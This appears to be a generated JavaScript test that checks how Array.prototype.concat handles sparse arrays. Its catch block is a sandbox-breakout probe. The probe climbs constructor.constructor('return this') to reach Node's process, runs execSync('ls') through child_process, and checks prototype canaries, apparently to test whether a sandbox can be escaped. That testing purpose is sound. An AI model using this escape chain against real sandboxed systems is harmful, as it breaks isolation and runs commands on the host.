try {
    var x = [
        ,
        1
    ];
    var arr = x.concat([], [,]);
    arr.getClass = Object.prototype.toString;
    if (arr.getClass() !== '[object ' + 'Array' + ']') {
        $ERROR('#0: var x = [,1]; var arr = x.concat([], [,]); arr is Array object. Actual: ' + arr.getClass());
    }
    if (arr[0] !== undefined) {
        $ERROR('#1: var x = [,1]; var arr = x.concat([], [,]); arr[0] === undefined. Actual: ' + arr[0]);
    }
    if (arr[1] !== 1) {
        $ERROR('#2: var x = [,1]; var arr = x.concat([], [,]); arr[1] === 1. Actual: ' + arr[1]);
    }
    if (arr[2] !== undefined) {
        $ERROR('#2: var x = [,1]; var arr = x.concat([], [,]); arr[2] === undefined. Actual: ' + arr[2]);
    }
    if (arr.length !== 3) {
        $ERROR('#4: var x = [,1]; var arr = x.concat([], [,]); arr.length === 3. Actual: ' + arr.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}